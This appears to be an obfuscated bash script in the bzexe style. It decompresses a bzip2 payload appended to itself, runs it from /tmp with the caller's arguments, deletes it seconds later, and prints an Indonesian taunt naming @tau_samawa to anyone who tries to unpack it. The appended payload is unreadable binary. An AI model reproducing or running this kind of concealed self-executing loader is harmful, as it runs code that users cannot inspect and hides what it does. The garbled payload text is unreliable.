#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYvVԃ  b� }��v/�����@mU.ѻA�i4=OJz��Q�ѵ��=5��$�$��ښz��     ��OS�&��z��z�Pz�����4	"�d�zM�   ����+-�s�{����Z��hA�Oы9$*�Y�R�ud}6*r�����fF�)�Vlq�S0�x���
��VhSc��"a���Ա,�r��jWRN�{��(���I*�&��X��c�p����.l�I~w/E�\2$��J�#�W��6�iH~�Fm���.�)��(�¹�WFX�\�Ϛ� �y��^^�Fb�>h/�v]� f�G`�%<}�	��v��D���F`7�����i�rW�d�u]t*����:K�2��Tx
/0[0�r�6�f%J&�4(J�N��!.�H��lز���w�:�8�E�饎X0b R&�!�@�oF3@�w I�\V�ܟ�k�f�-cu���	U>P�ajT�E�Hۅ=.vU1�rCA��d��B�o6~4�ӕgB�������>
x%40�[f�����_�M.�c�����KG(�� Oa�\T@�Ag9`r���
H�8'��,��d,�B��c@�h.HEE�i^���Y �a*�X���c)�
Ìj�B4	'�a,�(�!e�A�G� :��Y5��.�p� 쭩